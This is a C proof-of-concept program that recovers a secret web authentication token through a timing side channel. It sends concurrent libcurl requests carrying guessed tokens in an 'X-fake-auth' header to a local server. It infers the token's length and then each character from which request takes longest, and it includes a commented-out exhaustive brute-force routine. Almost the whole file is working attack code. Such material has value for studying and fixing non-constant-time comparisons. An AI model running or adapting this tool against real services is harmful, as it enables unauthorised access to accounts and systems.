/*
 POC to brute force bad web token implementation

 Server pseudo code:

 if (strlen(token) != TOKEN_LEN)
    return 401

 for (i=0; i < TOKEN_LEN; i++) {
    if (token[i] == TOKEN[i]) // takes some measurable time
        continue;
    else
        return 401

 }

 return 200

 */
#include <curl/curl.h>
#include <dispatch/dispatch.h>
#include <errno.h>
#include <mach/clock.h>
#include <mach/mach.h>
#include <math.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <time.h>

#define TOKEN_MAX_LEN 15

static dispatch_queue_t _httpclient_q() {
  static dispatch_once_t once = 0;
  static dispatch_queue_t q   = NULL;
  dispatch_once(&once, ^{
    q = dispatch_queue_create("httpclient.q", DISPATCH_QUEUE_CONCURRENT);
  });
  return q;
}

static long make_connection_with_authtoken(const char *auth_token,
                                           time_t *authtime) {
  CURL *curl         = NULL;
  CURLcode res       = CURLE_OK;
  long response_code = 0;
  struct timespec t0, t1;

  curl = curl_easy_init();
  if (curl) {
    struct curl_slist *chunk = NULL;
    char *auth_header        = NULL;
    size_t auth_header_len   = strlen("X-fake-auth:") + strlen(auth_token) + 2;
    auth_header              = malloc(auth_header_len);

    if (auth_header != NULL) {
      snprintf(auth_header, auth_header_len, "X-fake-auth: %s", auth_token);
    }

    chunk = curl_slist_append(chunk, auth_header);

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
    curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8000/");
    // curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    clock_gettime(CLOCK_MONOTONIC, &t0);
    res = curl_easy_perform(curl);
    clock_gettime(CLOCK_MONOTONIC, &t1);

    *authtime = round((t1.tv_nsec - t0.tv_nsec) / 1000000);
    *authtime += (t1.tv_sec - t0.tv_sec) * 1000;

    if (res == CURLE_OK) {
      curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    }

    curl_easy_cleanup(curl);
    curl_slist_free_all(chunk);

    free(auth_header);
  }
  return response_code;
}

static int find_token_length() {
  int i                         = 0;
  int token_len                 = 0;
  char token[TOKEN_MAX_LEN + 1] = "";
  char *token_refs[TOKEN_MAX_LEN];
  time_t auth_times[TOKEN_MAX_LEN];
  time_t max_time        = 0;
  dispatch_group_t group = dispatch_group_create();

  for (i = 0; i < TOKEN_MAX_LEN; i++) {
    // can't pass arrays to blocks
    __block char *tmp_token  = NULL;
    __block time_t *authtime = NULL;

    strcat(token, "X"); // increase len of fake token
    tmp_token     = strdup(token);
    token_refs[i] = tmp_token; // save to free later
    authtime      = &(auth_times[i]);

    dispatch_group_enter(group);
    dispatch_async(_httpclient_q(), ^() {
      make_connection_with_authtoken(tmp_token, authtime);

      dispatch_group_leave(group);
    });
  }

  // wait for concurrent blocks to finish
  dispatch_group_wait(group, DISPATCH_TIME_FOREVER);

  // find index/len based on longest response time...
  for (i = 0; i < TOKEN_MAX_LEN; i++) {
    if (auth_times[i] > max_time) {
      max_time  = auth_times[i];
      token_len = i + 1;
    }
  }

  // free all token refs
  for (i = 0; i < TOKEN_MAX_LEN; i++) {
    free(token_refs[i]);
  }

  dispatch_release(group);

  return token_len;
}

// run set length connections concurrently to find token...
static int find_token(char *set, int token_len, char **outtoken) {
  int i                  = 0;
  int char_idx           = 0;
  int set_len            = strlen(set);
  time_t *auth_times     = NULL;
  time_t max_time        = 0;
  char **token_refs      = NULL;
  __block char *_final   = NULL;
  dispatch_group_t group = dispatch_group_create();
  char *token            = malloc(sizeof(char) * token_len + 1);
  bzero(token, sizeof(char) * token_len + 1);
  memset(token, 'X', token_len);

  auth_times = malloc(sizeof(time_t) * set_len);
  bzero(auth_times, sizeof(time_t) * set_len);

  token_refs = malloc(sizeof(char *) * set_len);
  bzero(token_refs, sizeof(char *) * set_len);

  for (int j = 0; j < token_len; j++) {
    // try every char in set at position j
    for (i = 0; set[i] != '\0'; i++) {
      // can't pass arrays to blocks
      __block time_t *authtime = NULL;
      __block char *tmp_token  = NULL;
      authtime                 = &(auth_times[i]);
      if (token_refs[i] == NULL) {
        tmp_token     = strdup(token);
        token_refs[i] = tmp_token; // save to free later
      } else {
        // reuse the previous buffer
        tmp_token = token_refs[i];
        strcpy(tmp_token, token);
      }
      tmp_token[j] = set[i];

      dispatch_group_enter(group);
      dispatch_async(_httpclient_q(), ^() {
        int retval = 0;
        retval     = make_connection_with_authtoken(tmp_token, authtime);

        if (retval == 200) {
          // save the working token
          _final = strdup(tmp_token);
        }

        dispatch_group_leave(group);
      });
    }

    // wait for concurrent blocks to finish
    dispatch_group_wait(group, DISPATCH_TIME_FOREVER);

    // find index based on longest response time...
    max_time = 0;
    char_idx = 0;
    for (i = 0; i < set_len; i++) {
      if (auth_times[i] > max_time) {
        max_time = auth_times[i];
        char_idx = i;
      }
    }

    token[j] = set[char_idx];
  }

  free(token);

  // free all token refs
  for (i = 0; i < set_len; i++) {
    free(token_refs[i]);
  }

  free(token_refs);
  free(auth_times);

  // return the token
  *outtoken = _final;

  dispatch_release(group);

  return char_idx;
}

// brute force with all enumerations of length len from made up of set chars
// runs serially
int try_all_tokens(char set[], char *token, int len, char **out) {
  int ret = 0;
  time_t authtime;
  if (len == 0) {
    if (make_connection_with_authtoken(token, &authtime) == 200) {
      *out = strdup(token);
      return 1;
    }

    return 0;
  }

  for (int i = 0; set[i] != '\0'; i++) {
    char *next_token = malloc(strlen(token) + 2);
    bzero(next_token, strlen(token) + 2);

    strcat(next_token, token);
    next_token[strlen(token)] = set[i];

    if ((ret = try_all_tokens(set, next_token, len - 1, out)) == 1) {
      free(next_token);
      break;
    }
    free(next_token);
  }

  return ret;
}

int main(int argc, char *argv[]) {
  char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  char *found     = NULL;
  int token_len   = find_token_length();
  printf("Trying all tokens of length %d\n", token_len);
  /*
    // brute force method
    char *token = malloc(sizeof(char) * (token_len + 1));
    bzero(token, (sizeof(char) * (token_len + 1)));
    try_all_tokens(alphabet, token, token_len, &found);
    free(token);
  */

  find_token(alphabet, token_len, &found);
  if (found != NULL) {
    printf("token is %s\n", found);
    free(found);
  }

  // check for memory leaks
  // system("leaks bruteforce");

  return 0;
}
